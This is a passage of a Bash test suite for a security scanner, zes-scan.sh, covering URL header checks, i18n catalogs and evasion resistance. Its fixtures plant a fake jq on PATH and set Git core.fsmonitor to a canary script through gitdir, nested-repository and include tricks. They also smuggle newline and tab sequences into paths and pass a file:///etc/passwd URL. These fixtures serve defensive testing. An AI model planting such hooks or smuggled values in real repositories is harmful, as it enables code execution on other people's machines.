ZES_HOME="$TMP/nonexistent-home" "$SCAN" --quick --root "$TMP/empty-root" >/dev/null 2>&1; [ $? -eq 64 ] && ok "存在しない ZES_HOME を拒否" || ng "存在しない ZES_HOME を受理"

# FIFOs, sockets etc. inside the scan root are recorded in errors[] as special_file without being opened (never silently dropped)
if command -v mkfifo >/dev/null 2>&1; then
  mkdir -p "$TMP/special" && mkfifo "$TMP/special/pipe.fifo"
  run_scan "$TMP/special" quick "$FIX/_home" | jq -e --arg p "special_file:$TMP/special/pipe.fifo" '[.errors[] | select(.module == "core" and .reason == $p)] | length == 1' >/dev/null 2>&1 \
    && ok "検査ルート内の FIFO を errors[] に special_file として記録" || ng "検査ルート内の FIFO が errors[] に記録されていません"
fi

# §4 --url: evaluates PHP/x.y.z in Server and X-Powered-By, GET only when HEAD returns 405, redirects are not followed
#   Run against a local HTTP server (python3, test-only)
if python3 -I -c 'import http.server' 2>/dev/null && command -v curl >/dev/null 2>&1; then
  python3 -I - "$TMP/http-port" "$TMP/http-log" <<'PY' >/dev/null 2>&1 &
import http.server, sys
class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def reply(self, body):
        open(sys.argv[2], "a").write(f"{self.command} {self.path}\n")
        if self.path == "/redir":
            self.send_response(301); self.send_header("Location", "/vuln"); self.end_headers(); return
        if self.command == "HEAD" and self.path == "/":
            self.send_response(405); self.end_headers(); return
        self.send_response(200)
        self.send_header("Server", "Apache/2.4.58 (Ubuntu) PHP/8.3.10")
        self.send_header("X-Powered-By", "PHP/8.5.12")
        self.end_headers()
        if body: self.wfile.write(b"zes\n")
    def do_HEAD(self): self.reply(False)
    def do_GET(self): self.reply(True)
s = http.server.HTTPServer(("127.0.0.1", 0), H)
open(sys.argv[1], "w").write(str(s.server_port))
s.timeout = 30
for _ in range(6): s.handle_request()
PY
  hpid=$!
  for _ in $(seq 1 50); do [ -s "$TMP/http-port" ] && break; sleep 0.1; done
  port="$(cat "$TMP/http-port" 2>/dev/null)"
  urlscan() { env -u http_proxy -u HTTP_PROXY -u https_proxy -u HTTPS_PROXY -u ALL_PROXY -u all_proxy NO_PROXY='*' \
    ZES_HOST_CHECKS=0 ZES_OFFLINE=0 ZES_HOME="$FIX/_home" "$SCAN" --quick --root "$TMP/empty-root" --url "http://127.0.0.1:$port$1" --json 2>/dev/null; }
  out="$(urlscan /)"
  printf '%s' "$out" | jq -e '[.findings[] | select(.module == "§4" and .level == "HIGH" and .params.version == "8.3.10")] | length == 1' >/dev/null 2>&1 \
    && printf '%s' "$out" | jq -e '[.findings[] | select(.module == "§4" and .level == "MEDIUM" and .code == "s4.header_exposes")] | length == 1' >/dev/null 2>&1 \
    && ok "--url: Server ヘッダの PHP/8.3.10 を HIGH（ヘッダ申告版）で判定し、X-Powered-By の露出も報告" || ng "--url の PHP ヘッダ判定が不正"
  out="$(urlscan /redir)"
  printf '%s' "$out" | jq -e '[.findings[] | select(.module == "§4" and .level == "HIGH")] | length == 0' >/dev/null 2>&1 \
    && ok "--url: リダイレクト先を追わない" || ng "--url がリダイレクトを追っています"
  kill "$hpid" 2>/dev/null; wait "$hpid" 2>/dev/null
  [ "$(tr '\n' ',' <"$TMP/http-log" 2>/dev/null)" = "HEAD /,GET /,HEAD /redir," ] && ok "--url: HEAD → 405 のときだけ GET（リクエスト列: HEAD /,GET /,HEAD /redir）" \
    || ng "--url のリクエスト列が不正: $(tr '\n' ',' <"$TMP/http-log" 2>/dev/null)"
else
  printf '  SKIP --url のローカル HTTP テスト（python3 または curl が無い）\n'
fi

# Argument validation (fail-closed)
"$SCAN" --root /nonexistent-zes-dir >/dev/null 2>&1; [ $? -eq 64 ] && ok "存在しない --root を拒否" || ng "存在しない --root を受理"
"$SCAN" --quick --url 'file:///etc/passwd' >/dev/null 2>&1; [ $? -eq 64 ] && ok "http(s) 以外の --url を拒否" || ng "不正な --url を受理"
"$SCAN" --quick --full >/dev/null 2>&1; [ $? -eq 64 ] && ok "モード重複指定を拒否" || ng "モード重複指定を受理"
# A --root starting with '-' must not be read as a cd option (no exit 0 with an empty root)
mkdir -p "$TMP/dash" && cp -R "$FIX/chaindrop" "$TMP/dash/-dash"
n="$(cd "$TMP/dash" && ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$FIX/_home" "$SCAN" --quick --root -dash --json 2>/dev/null | jq --arg r "$TMP/dash/-dash/" '[.findings[] | select((.path // "") | startswith($r))] | length' 2>/dev/null)"
[ "${n:-0}" -gt 0 ] && ok "'-' で始まる --root を走査（cd -- で解決）" || ng "'-' で始まる --root を走査していません（${n:-?} 件）"
# An exported CDPATH does not resolve a relative --root to another directory
mkdir -p "$TMP/cdpath/decoy/chaindrop" "$TMP/cdpath/cwd" && cp -R "$FIX/chaindrop" "$TMP/cdpath/cwd/chaindrop"
n="$(cd "$TMP/cdpath/cwd" && CDPATH="$TMP/cdpath/decoy" ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$FIX/_home" "$SCAN" --quick --root chaindrop --json 2>/dev/null | jq --arg r "$TMP/cdpath/cwd/chaindrop/" '[.findings[] | select((.path // "") | startswith($r))] | length' 2>/dev/null)"
[ "${n:-0}" -gt 0 ] && ok "CDPATH が相対 --root を書き換えない" || ng "CDPATH により相対 --root が別ディレクトリへ解決されました（${n:-?} 件）"

# Version match: first version in CHANGELOG = ZES_VERSION in zes-scan.sh = version in ui/package.json
if out="$(bash "$TESTS_DIR/check-versions.sh" 2>&1)"; then ok "$out"; else ng "版がずれています" "$out"; fi
# ---------------------------------------------------------------------------
echo "== i18n（メッセージカタログ・findings 1.2） =="
# Catalog files: same keys and placeholders in en / ja, one entry per line in C-locale key order, only \" and \\ escapes,
#   no URL / HTML / control characters, no Japanese in en.json; every f.* / log.* / cli.* key used by zes-scan.sh exists
#   and every such key is used (an f.* key also counts as used when the browser engine in ui/src uses it, and every
#   code ui/src uses exists); the inline cli.* block of zes-scan.sh equals the catalog; no CJK outside comments in
#   zes-scan.sh except the Bash < 4 message and the Japanese cli.* block
if out="$(python3 -I - "$REPO" <<'PY' 2>&1
import json, os, re, subprocess, sys
repo = sys.argv[1]
err = []
raw = {l: open(f"{repo}/i18n/{l}.json", encoding="utf-8").read() for l in ("en", "ja")}
cat = {l: json.loads(raw[l]) for l in raw}
holes = lambda s: sorted(re.findall(r"\{([a-z_]+)\}", s))
CJK = re.compile(r"[　-ヿ㐀-鿿＀-￯]")
for l in raw:
    lines = raw[l].split("\n")
    if lines[0] != "{" or lines[-1] != "" or lines[-2] != "}": err.append(f"{l}.json: frame")
    body = lines[1:-2]; keys = []
    for i, line in enumerate(body):
        m = re.fullmatch(r'"([a-z0-9_.]+)": "((?:[^"\\]|\\["\\])*)"(,?)', line)
        if not m: err.append(f"{l}.json:{i + 2}: {line[:80]}"); continue
        if m.group(3) != ("" if i == len(body) - 1 else ","): err.append(f"{l}.json:{i + 2}: comma")
        keys.append(m.group(1))
    if keys != sorted(keys, key=lambda k: k.encode()): err.append(f"{l}.json: keys not in C-locale order")
    for k, v in cat[l].items():
        if re.search(r"https?://", v) or re.search(r"</?[a-z][a-z0-9]*[\s>/]", v, re.I) or re.search(r"[\x00-\x1f\x7f‪-‮⁦-⁩]", v):
            err.append(f"{l}.json: {k}: URL, HTML or control character")
if set(cat["en"]) != set(cat["ja"]): err.append(f"en/ja keys differ: {sorted(set(cat['en']) ^ set(cat['ja']))[:10]}")
for k in cat["en"]:
    if k in cat["ja"] and holes(cat["en"][k]) != holes(cat["ja"][k]): err.append(f"placeholders differ: {k}")
    if CJK.search(cat["en"][k]) and not k.startswith("ui.lang."): err.append(f"en.json has Japanese: {k}")
src = open(f"{repo}/zes-scan.sh", encoding="utf-8").read()
code = "\n".join(l for l in src.split("\n") if not l.lstrip().startswith("#"))
used_f = set(re.findall(r"(?<![\w.$/-])((?:s[0-9]+|intel)\.[a-z0-9_.]*[a-z0-9_])(?!\w)", code))
# The browser engine (ui/src) uses the same codes as string literals, plus a few UI-only codes (paste.*, ...)
ui_src = "\n".join(open(os.path.join(d, n), encoding="utf-8").read() for d, _, ns in os.walk(f"{repo}/ui/src") for n in sorted(ns) if n.endswith((".ts", ".tsx")))
used_ui = set(re.findall(r"'((?:s[0-9]+|intel|paste)\.[a-z0-9_.]*[a-z0-9_])'", ui_src))
cat_f = {k[2:] for k in cat["en"] if k.startswith("f.")}
if used_f - cat_f: err.append(f"codes missing from the catalog: {sorted(used_f - cat_f)}")
if used_ui - cat_f: err.append(f"codes of ui/src missing from the catalog: {sorted(used_ui - cat_f)}")
if cat_f - used_f - used_ui: err.append(f"f.* keys used neither by zes-scan.sh nor by ui/src: {sorted(cat_f - used_f - used_ui)}")
used_l = set(re.findall(r"(?:log_info|safe|msg) (log\.[a-z0-9_.]+)", code)) | {f"log.section.s{n}" for n in re.findall(r'log_section "§([0-9]+)"', code)}
cat_l = {k for k in cat["en"] if k.startswith("log.")}
if used_l ^ cat_l: err.append(f"log.* keys: missing {sorted(used_l - cat_l)} unused {sorted(cat_l - used_l)}")
dump = subprocess.run(["bash", "-c", 'eval "$(sed -n "/^# >>> cli-messages/,/^# <<< cli-messages/p" "$1")"; for k in "${!CLI_MSG_EN[@]}"; do printf "E\\037%s\\037%s\\036" "$k" "${CLI_MSG_EN[$k]}"; done; for k in "${!CLI_MSG_JA[@]}"; do printf "J\\037%s\\037%s\\036" "$k" "${CLI_MSG_JA[$k]}"; done; printf "H\\037%s\\036" "${CLI_HELP_LINES[@]}"', "_", f"{repo}/zes-scan.sh"], capture_output=True, text=True).stdout
inline = {"en": {}, "ja": {}}; help_keys = []
for rec in dump.split("\x1e"):
    if not rec: continue
    p = rec.split("\x1f")
    if p[0] == "H": help_keys.append(p[1]); continue
    inline["en" if p[0] == "E" else "ja"][p[1]] = p[2]
for l in ("en", "ja"):
    cat_c = {k: v for k, v in cat[l].items() if k.startswith("cli.")}
    if cat_c != inline[l]: err.append(f"inline cli.* ({l}) differs from {l}.json: {sorted(set(cat_c.items()) ^ set(inline[l].items()))[:4]}")
used_c = set(re.findall(r"(?:arg_error|cli_fail|cli_text) (cli\.[a-z0-9_.]+)", code)) | {k for k in help_keys if k}
if used_c ^ set(inline["en"]): err.append(f"cli.* keys: missing {sorted(used_c - set(inline['en']))} unused {sorted(set(inline['en']) - used_c)}")
blk = src[src.index("# >>> cli-messages"):src.index("# <<< cli-messages")]
for i, l in enumerate(src.split("\n"), 1):
    m = CJK.search(l)
    if not m or l.lstrip().startswith("#") or (l in blk and l.lstrip().startswith("[cli.")) or l.startswith('  echo "ZES: Bash 4 以上'): continue
    if not re.search(r"\s#", l[:m.start()]): err.append(f"zes-scan.sh:{i}: Japanese outside a comment")
print("\n".join(err[:30]) or f"f.*={len(cat_f)} (CLI {len(used_f)}, UI {len(used_ui)}, UI only {len(used_ui - used_f)}) log.*={len(cat_l)} cli.*={len(inline['en'])}")
sys.exit(1 if err else 0)
PY
)"; then ok "カタログ i18n/en.json・ja.json（$out）: 形式・キー・プレースホルダ・zes-scan.sh の使用と一致"
else ng "カタログ i18n/*.json が不正" "$out"; fi

# render: the cases shared with the UI (i18n/tests/render-cases.json) through the bash zes_render of zes-scan.sh
if out="$(python3 -I - "$REPO" <<'PY' 2>&1
import json, subprocess, sys
repo = sys.argv[1]
cases = json.load(open(f"{repo}/i18n/tests/render-cases.json", encoding="utf-8"))["cases"]
prog = 'set -u; export LC_ALL=C; eval "$(sed -n "/^zes_render() {/,/^}/p" "$1")"; t="$2"; shift 2; zes_render "$t" "$@"; printf "%s" "$RENDERED"'
bad = []
for c in cases:
    params = {k: v.encode() for k, v in c.get("params", {}).items()}
    params.update({k: bytes.fromhex(v) for k, v in c.get("params_hex", {}).items()})
    want = bytes.fromhex(c["expected_hex"]) if "expected_hex" in c else c["expected"].encode()
    args = [b"bash", b"-c", prog.encode(), b"_", f"{repo}/zes-scan.sh".encode(), c["template"].encode()] + [k.encode() + b"=" + v for k, v in params.items()]
    got = subprocess.run(args, capture_output=True).stdout
    if got != want: bad.append(f"{c['name']}: {got!r} != {want!r}")
print("\n".join(bad) or f"{len(cases)} cases")
sys.exit(1 if bad else 0)
PY
)"; then ok "render（bash）が i18n/tests/render-cases.json と一致（$out）"
else ng "render（bash）が render-cases と不一致" "$out"; fi

# Every finding of every fixture: code is in the catalog, params are exactly the placeholders of f.<code>,
#   detail = render(en["f." + code], params), id = id v2, and findings.json has no Japanese
if out="$(python3 -I - "$REPO" "$TMP"/fx-*.json <<'PY' 2>&1
import hashlib, json, re, sys
repo = sys.argv[1]
en = json.load(open(f"{repo}/i18n/en.json", encoding="utf-8"))
CJK = re.compile(r"[　-ヿ㐀-鿿＀-￯]")
render = lambda t, p: re.sub(r"\{([a-z_]+)\}", lambda m: p.get(m.group(1), m.group(0)), t)
bad = []; n = 0; codes = set()
for f in sys.argv[2:]:
    raw = open(f, "rb").read().decode("utf-8")
    if CJK.search(raw): bad.append(f"{f.rsplit('/', 1)[-1]}: Japanese in findings.json: {CJK.search(raw).group(0)}")
    for x in json.loads(raw)["findings"]:
        n += 1; codes.add(x["code"]); t = en.get("f." + x["code"])
        if t is None: bad.append(f"unknown code {x['code']}"); continue
        if sorted(x["params"]) != sorted(set(re.findall(r"\{([a-z_]+)\}", t))): bad.append(f"params {x['code']}: {sorted(x['params'])}")
        if x["detail"] != render(t, x["params"]): bad.append(f"detail {x['code']}: {x['detail'][:80]}")
        esc = lambda s: s.replace("\\", "\\\\").replace("|", "\\|").replace("\x1f", "\\u001f")
        canon = "\x1f".join(k + "=" + esc(x["params"][k]) for k in sorted(x["params"], key=lambda k: k.encode()))
        if x["id"] != "sha256:" + hashlib.sha256("|".join(["zes-id-v2"] + [esc(y) for y in (x["module"], x["campaign"] or "", x["path"] or "", x["code"])] + [canon]).encode()).hexdigest():
            bad.append(f"id {x['code']} {x['path']}")
print("\n".join(bad[:20]) or f"{n} findings, {len(codes)} codes")
sys.exit(1 if bad or n == 0 else 0)
PY
)"; then ok "全フィクスチャの finding: detail = render(en, params)・params = プレースホルダ・id v2・日本語なし（$out）"
else ng "フィクスチャの finding の code / params / detail / id が不正" "$out"; fi

# findings.json does not depend on the terminal language: byte-identical (except the timestamps) for --lang en,
#   --lang ja, LANG=ja_JP.UTF-8 and LANG=C; the log follows the language
lang_ok=1; lang_msg=""
for nm in chaindrop skillpact-signed-divergence php gitlab; do
  dm="$(jq -r '.mode' "$EXP/$nm.json")"
  i=0
  for v in "--lang en" "--lang ja" "LANG=ja_JP.UTF-8" "LANG=C"; do
    i=$((i + 1))
    case "$v" in
      --lang*) ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$FIX/_home" ZES_NOW=1792800000 ZES_SKILLPACT_CACHE='' LANG=C LC_ALL='' "$SCAN" "--$dm" --root "$FIX/$nm" --json $v >"$TMP/lang-$i.json" 2>"$TMP/lang-$i.log" ;;
      *) env ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$FIX/_home" ZES_NOW=1792800000 ZES_SKILLPACT_CACHE='' LC_ALL='' "$v" "$SCAN" "--$dm" --root "$FIX/$nm" --json >"$TMP/lang-$i.json" 2>"$TMP/lang-$i.log" ;;
    esac
    sed -E 's/"scan_(started|finished)_at":"[^"]*"//g' "$TMP/lang-$i.json" >"$TMP/lang-$i.norm"
  done
  for i in 2 3 4; do cmp -s "$TMP/lang-1.norm" "$TMP/lang-$i.norm" || { lang_ok=0; lang_msg="$lang_msg $nm#$i"; }; done
  [ "$(jq '.findings | length' "$TMP/lang-1.json")" -gt 0 ] || { lang_ok=0; lang_msg="$lang_msg $nm:empty"; }
  grep -q '結果' "$TMP/lang-2.log" && grep -q '結果' "$TMP/lang-3.log" && grep -q '== Result ==' "$TMP/lang-1.log" && grep -q '== Result ==' "$TMP/lang-4.log" \
    || { lang_ok=0; lang_msg="$lang_msg $nm:log"; }
done
[ "$lang_ok" -eq 1 ] && ok "findings.json は --lang en / --lang ja / LANG=ja_JP.UTF-8 / LANG=C で時刻以外同一（ログは選んだ言語）" || ng "findings.json が端末の言語で変わる:$lang_msg"

# jq-less runs give the same detail / code / params / id (every finding of the grep fallback is in the jq run)
run_scan "$FIX/chaindrop" quick "$FIX/_home" >"$TMP/jq-yes.json"
run_scan "$FIX/chaindrop" quick "$FIX/_home" env ZES_FORCE_NO_JQ=1 >"$TMP/jq-no.json"
if jq -e -n --slurpfile a "$TMP/jq-yes.json" --slurpfile b "$TMP/jq-no.json" '
    ([$a[0].findings[] | {id, detail, code, params}]) as $y | [$b[0].findings[] | {id, detail, code, params}] as $n
    | ($n | length) > 0 and all($n[]; . as $f | $y | index([$f]) != null)' >/dev/null; then
  ok "jq なしでも detail / code / params / id が jq ありと同じ（grep フォールバックの全 finding が jq ありの出力にある）"
else ng "jq の有無で detail / code / params / id が変わる"; fi

# Terminal language: --lang > ZES_LANG > LC_ALL > LC_MESSAGES > LANG; ja (no charset / UTF-8) → ja, eucJP / SJIS → en
lsel() { env -u LC_ALL -u LC_MESSAGES -u LANG -u ZES_LANG "$@" "$SCAN" --help 2>/dev/null | grep -c -F -e '検査ルート'; }
sel_ok=1; sel_msg=""
for c in "ja|LANG=ja_JP.UTF-8" "ja|LANG=ja_JP.utf8" "ja|LANG=ja_JP" "ja|LANG=ja" "en|LANG=ja_JP.eucJP" "en|LANG=ja_JP.SJIS" "en|LANG=C" "en|LANG=C.UTF-8" \
         "en|LANG=en_US.UTF-8" "en|LANG=fr_FR.UTF-8" "ja|LC_ALL=ja_JP.UTF-8 LANG=C" "en|LC_ALL=C LANG=ja_JP.UTF-8" "ja|LC_MESSAGES=ja_JP.UTF-8 LANG=C" \
         "en|LC_MESSAGES=C LANG=ja_JP.UTF-8" "ja|ZES_LANG=ja LANG=C" "en|ZES_LANG=en LANG=ja_JP.UTF-8" "en|ZES_LANG=xx LANG=ja_JP.UTF-8" "en|"; do
  want="${c%%|*}"; e="${c#*|}"
  # shellcheck disable=SC2086
  n="$(lsel $e)"; [ "$want" = ja ] && [ "$n" = 1 ] && continue; [ "$want" = en ] && [ "$n" = 0 ] && continue
  sel_ok=0; sel_msg="$sel_msg [$e → ${want}?]"
done
n="$(env -u LC_ALL -u LANG ZES_LANG=en "$SCAN" --help --lang ja 2>/dev/null | grep -c -F '検査ルート')"; [ "$n" = 1 ] || { sel_ok=0; sel_msg="$sel_msg [--help --lang ja]"; }
n="$(env LANG=ja_JP.UTF-8 "$SCAN" --lang en --help 2>/dev/null | grep -c -F 'Directory to scan')"; [ "$n" = 1 ] || { sel_ok=0; sel_msg="$sel_msg [--lang en --help]"; }
env -u LC_ALL LANG=C "$SCAN" --quick --lang xx >/dev/null 2>"$TMP/lang-xx.err"; rc=$?
{ [ "$rc" = 64 ] && grep -q -x -F 'ZES: --lang must be en or ja' "$TMP/lang-xx.err"; } || { sel_ok=0; sel_msg="$sel_msg [--lang xx rc=$rc]"; }
env -u LC_ALL LANG=C "$SCAN" --quick --lang >/dev/null 2>&1; [ $? = 64 ] || { sel_ok=0; sel_msg="$sel_msg [--lang without a value]"; }
env -u LC_ALL LANG=C "$SCAN" --lang ja --bogus >/dev/null 2>"$TMP/lang-arg.err"; rc=$?
{ [ "$rc" = 64 ] && grep -q -F 'ZES: 不明な引数: --bogus' "$TMP/lang-arg.err"; } || { sel_ok=0; sel_msg="$sel_msg [arg error in ja rc=$rc]"; }
env -u LC_ALL LANG=C "$SCAN" --bogus >/dev/null 2>"$TMP/lang-arg.err"; rc=$?
{ [ "$rc" = 64 ] && grep -q -F 'ZES: Unknown argument: --bogus' "$TMP/lang-arg.err"; } || { sel_ok=0; sel_msg="$sel_msg [arg error in en rc=$rc]"; }
[ "$sel_ok" -eq 1 ] && ok "端末の言語の選択（--lang > ZES_LANG > LC_ALL > LC_MESSAGES > LANG、eucJP / SJIS / 不正な ZES_LANG は en、--lang xx は 64）" || ng "端末の言語の選択が不正:$sel_msg"
# The help and argument errors equal the catalog (cli.*): checked above with the inline block. An unreadable catalog is exit 64
ZES_I18N_DIR="$TMP/no-catalog" run_scan "$FIX/chaindrop" quick "$FIX/_home" >/dev/null; rc=$?
{ [ "$rc" = 64 ] && grep -q -F "ZES: Cannot read the message catalog: $TMP/no-catalog/en.json" "$TMP/stderr.txt"; } \
  && ok "メッセージカタログを読めない場合は exit 64" || ng "読めないメッセージカタログで exit 64 にならない（rc=$rc）"
# (a well-formed ja.json beside it, so that only the escape makes it fail)
mkdir -p "$TMP/bad-catalog" && cp "$REPO/i18n/ja.json" "$TMP/bad-catalog/" && sed '2s/": "/": "\\u0041/' "$REPO/i18n/en.json" >"$TMP/bad-catalog/en.json"
ZES_I18N_DIR="$TMP/bad-catalog" run_scan "$FIX/chaindrop" quick "$FIX/_home" >/dev/null; rc=$?
[ "$rc" = 64 ] && ok "形式の不正なメッセージカタログ（\\u エスケープ）は exit 64" || ng "形式の不正なカタログを受理（rc=$rc）"

# ---------------------------------------------------------------------------
echo "== round 3（CLI の検出回避・fail-closed） =="
# R3-01: relative and empty PATH entries and entries whose real path is under the scan root are dropped, and path_entry_dropped is recorded in errors[]
mkdir -p "$TMP/pathroot/node_modules/.bin"
printf '#!/bin/sh\n: >"%s/path-canary"\nexec /usr/bin/env jq "$@"\n' "$TMP" >"$TMP/pathroot/node_modules/.bin/jq"; chmod +x "$TMP/pathroot/node_modules/.bin/jq"
out="$(cd "$TMP/pathroot/node_modules/.bin" && PATH=".:$TMP/pathroot/node_modules/.bin:$PATH" run_scan "$TMP/pathroot" quick "$FIX/_home")"
printf '%s' "$out" | jq -e --arg p "path_entry_dropped:$TMP/pathroot/node_modules/.bin" '([.errors[] | select(.module == "core" and (.reason == "path_entry_dropped:." or .reason == $p))] | length == 2)' >/dev/null 2>&1 \
  && [ ! -e "$TMP/path-canary" ] && ok "PATH の相対エントリ・検査ルート配下のエントリを外し errors[] に記録（ルート内の jq を起動しない）" \
  || ng "PATH の無害化が不正（canary=$([ -e "$TMP/path-canary" ] && echo yes || echo no)）"

# R3-02: Git configs of .git files (gitdir:), nested repositories and include.path targets are checked statically and never read by git
if command -v git >/dev/null 2>&1; then
  printf '#!/bin/sh\n: >"%s/git-r3-canary"\n' "$TMP" >"$TMP/git-r3-pwn.sh"; chmod +x "$TMP/git-r3-pwn.sh"
  ginit() { ( export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1; mkdir -p "$1" && cd "$1" && git init -q . ) >/dev/null 2>&1; }
  # gitdir: file (.git is a file; the real directory is gd/)
  ginit "$TMP/r3git/gitfile" && mv "$TMP/r3git/gitfile/.git" "$TMP/r3git/gitfile/gd" && printf 'gitdir: gd\n' >"$TMP/r3git/gitfile/.git" \
    && printf '\tfsmonitor = %s\n' "$TMP/git-r3-pwn.sh" >>"$TMP/r3git/gitfile/gd/config"
  # Nested repository (vendor/lib/.git)
  ginit "$TMP/r3git/nested" && ginit "$TMP/r3git/nested/vendor/lib" && printf '\tfsmonitor = %s\n' "$TMP/git-r3-pwn.sh" >>"$TMP/r3git/nested/vendor/lib/.git/config"
  # include.path target (../tools.cfg)
  ginit "$TMP/r3git/include" && printf '[include]\n\tpath = ../tools.cfg\n' >>"$TMP/r3git/include/.git/config" \
    && printf '[core]\n\tfsmonitor = %s\n' "$TMP/git-r3-pwn.sh" >"$TMP/r3git/include/tools.cfg"
  # A gitdir: pointing outside the scan root (git worktree etc.) is not read and is recorded in errors[]
  mkdir -p "$TMP/r3git/outside" && printf 'gitdir: %s/r3git/gitfile/gd\n' "$TMP" >"$TMP/r3git/outside/.git"
  # .git/config is a link pointing outside the root (/proc etc.): not read, recorded in errors[], and the scan does not stall
  ginit "$TMP/r3git/proclink" && rm -f "$TMP/r3git/proclink/.git/config" && ln -s /proc/self/status "$TMP/r3git/proclink/.git/config"
  for k in gitfile:gd/config nested:vendor/lib/.git/config include:tools.cfg; do
    r="$TMP/r3git/${k%%:*}"
    run_scan "$r" full "$FIX/_home" >"$TMP/r3git.json"
    jq -e --arg p "$r/${k#*:}" '[.findings[] | select(.module == "§26" and .level == "CRITICAL" and .path == $p)] | length == 1' "$TMP/r3git.json" >/dev/null 2>&1 \
      && ok "Git 設定を静的に検査（${k%%:*}: ${k#*:} の core.fsmonitor を CRITICAL）" || ng "Git 設定（${k%%:*}）の core.fsmonitor を検出していません"
  done
  run_scan "$TMP/r3git/outside" quick "$FIX/_home" | jq -e --arg p "gitdir_outside_root:$TMP/r3git/outside/.git" '[.errors[] | select(.reason == $p)] | length == 1' >/dev/null 2>&1 \
    && ok "検査ルート外を指す gitdir: を errors[] に gitdir_outside_root として記録" || ng "検査ルート外を指す gitdir: が errors[] に記録されていません"
  out="$(ZES_GIT_TIMEOUT=10 timeout 120 env ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$FIX/_home" "$SCAN" --full --root "$TMP/r3git/proclink" --json 2>/dev/null)"
  printf '%s' "$out" | jq -e --arg p "path_leaves_root:$TMP/r3git/proclink/.git/config" '[.errors[] | select(.reason == $p)] | length == 1' >/dev/null 2>&1 \
    && ok ".git/config がルート外（/proc）を指すリンクは読まずに errors[] に path_leaves_root" || ng ".git/config のルート外リンクの扱いが不正"
  [ -e "$TMP/git-r3-canary" ] && ng "検査対象の Git 設定（fsmonitor）が実行されました" || ok "検査対象の Git 設定（gitdir: / 入れ子 / include）を実行しない"

  # R3-21: git log in §38 must not quote paths in C style (core.quotePath=false and -z)
  ( export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
    mkdir -p "$TMP/r3qp/.github/workflows" && cd "$TMP/r3qp" && git init -q . \
      && printf 'on: push\njobs: {}\n' >".github/workflows/été.yml" && printf 'on: push\njobs: {}\n' >'.github/workflows/a"b.yml' && git add -A \
      && GIT_COMMITTER_DATE="@$((1792800000 - 86400)) +0000" GIT_AUTHOR_DATE="@$((1792800000 - 86400)) +0000" git -c user.name=a -c user.email=a@example.invalid commit -q -m init ) >/dev/null 2>&1
  n="$(run_scan "$TMP/r3qp" full "$FIX/_home" | jq --arg a "$TMP/r3qp/.github/workflows/été.yml" --arg b "$TMP/r3qp/.github/workflows/a\"b.yml" '[.findings[] | select(.module == "§38" and (.path == $a or .path == $b))] | length')"
  [ "$n" = "2" ] && ok "§38 の新規ワークフローのパスを引用符・\\NNN なしで出力（é / \" を含む名前）" || ng "§38 のパスが C 形式で引用されています（一致 ${n:-?} 件）"

  # K2: no orphaned sleep is left even without timeout (bash watchdog)
  mkdir -p "$TMP/notimeout"
  for b in /usr/bin/* /bin/*; do n="${b##*/}"; [ "$n" = timeout ] || [ -e "$TMP/notimeout/$n" ] || ln -s "$b" "$TMP/notimeout/$n" 2>/dev/null; done
  ZES_GIT_TIMEOUT=37 PATH="$TMP/notimeout" ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$FIX/_home" "$SCAN" --full --root "$TMP/r3qp" --json >/dev/null 2>&1
  sleep 1
  n="$(pgrep -f -x 'sleep 37' 2>/dev/null | wc -l | tr -d ' ')"
  [ "$n" = "0" ] && ok "timeout が無い環境のウォッチドッグが sleep を残さない" || ng "ウォッチドッグの sleep が ${n} 個残っています"
else
  printf '  SKIP git が無いため round 3 の Git 設定チェックを省略\n'
fi

# R3-07 / R3-08: backslashes in paths are not expanded by awk -v (no forged lines, no altered paths)
mkdir -p "$TMP/r3bs/app\\nx" "$TMP/r3bs/q\\nnpm\\tkeyv\\t6.0.0\\tz"
printf '# yarn lockfile v1\n\n"keyv@^6.0.0":\n  version "6.0.0"\n' >"$TMP/r3bs/app\\nx/yarn.lock"
printf '# yarn lockfile v1\n\n"left-pad@^1.0.0":\n  version "1.3.0"\n' >"$TMP/r3bs/q\\nnpm\\tkeyv\\t6.0.0\\tz/yarn.lock"
out="$(run_scan "$TMP/r3bs" worm "$FIX/_home")"
printf '%s' "$out" | jq -e --arg p "$TMP/r3bs/app\\nx/yarn.lock" '[.findings[] | select(.module == "§15")] | (length == 1 and .[0].path == $p)' >/dev/null 2>&1 \
  && ok "パス中の \\n / \\t を awk で展開しない（偽の依存行を作らせない・パスを変えない）" || ng "パスのバックスラッシュで §15 の結果が変わっています"

# R3-10: configs under a link name (.mcp.json → cfg/servers.json) are checked. Links with a config name pointing outside the root are recorded in errors[]
# Links whose target does not exist are not kept in the repository (the GitHub Pages artifact build tar --dereference fails on them), so they are created here
mkdir -p "$TMP/r3link/out" && ln -s /nonexistent-zes-outside/servers.json "$TMP/r3link/out/.mcp.json"
printf '%s' "$(run_scan "$TMP/r3link" quick "$FIX/_home")" | jq -e --arg p "symlink_leaves_root:$TMP/r3link/out/.mcp.json" '[.errors[] | select(.reason == $p)] | length == 1' >/dev/null 2>&1 \
  && ok "検査ルート外を指す設定名のリンクを errors[] に symlink_leaves_root として記録" || ng "ルート外を指す設定名のリンクが errors[] に記録されていません"

# R3-05: YAML aliases are not resolved and are recorded in errors[]
run_scan "$FIX/r3-actions" quick "$FIX/_home" >/dev/null
run_scan "$FIX/r3-actions" standard "$FIX/_home" | jq -e --arg p "yaml_alias_unresolved:$FIX/r3-actions/.github/workflows/alias.yml" '[.errors[] | select(.module == "§21" and .reason == $p)] | length == 1' >/dev/null 2>&1 \
  && ok "YAML のエイリアス（*x）を errors[] に yaml_alias_unresolved として記録" || ng "YAML のエイリアスが errors[] に記録されていません"

# R3-17: bun.lockb (binary) is not parsed; lockfile_unparsed in errors[]
run_scan "$FIX/r3-lockfiles" worm "$FIX/_home" | jq -e --arg p "lockfile_unparsed:$FIX/r3-lockfiles/bunb/bun.lockb" '[.errors[] | select(.module == "§15" and .reason == $p)] | length == 1' >/dev/null 2>&1 \
